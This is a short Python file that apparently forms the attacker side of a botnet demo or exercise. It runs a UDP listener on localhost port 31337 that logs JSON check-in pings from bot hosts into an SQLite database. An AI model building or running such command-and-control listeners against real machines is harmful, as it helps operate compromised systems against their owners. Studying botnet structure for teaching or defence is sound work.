import json
import logging
import sqlite3
from socketserver import ThreadingUDPServer, BaseRequestHandler
from datetime import datetime, timezone


HOST = 'localhost'
PORT = 31337
DATABASE = 'botnet.sqlite3'


logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime).19s] %(levelname)s (%(name)s) %(message)s')
log = logging.getLogger('botnet.attacker.ping_server')


with sqlite3.connect('botnet.sqlite3') as db:
    db.execute("""
        CREATE TABLE IF NOT EXISTS ping (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            datetime DATETIME,
            host TEXT,
            port INTEGER)""")


class UDPHandler(BaseRequestHandler):
    def handle(self):
        host, port = self.client_address
        data = json.loads(self.request[0])
        log.info(f'Received ping from {host}:{port}/UDP')

        # noinspection PyShadowingNames
        with sqlite3.connect('botnet.sqlite3') as db:
            db.execute('INSERT INTO ping VALUES (NULL, :datetime, :host, :port)', {
                'datetime': datetime.now(tz=timezone.utc),
                'host': data['host'],
                'port': data['port'],
            })


if __name__ == '__main__':
    log.info(f'Listening for pings on {HOST}:{PORT}/UDP...')
    listener = ThreadingUDPServer((HOST, PORT), UDPHandler)
    listener.serve_forever()
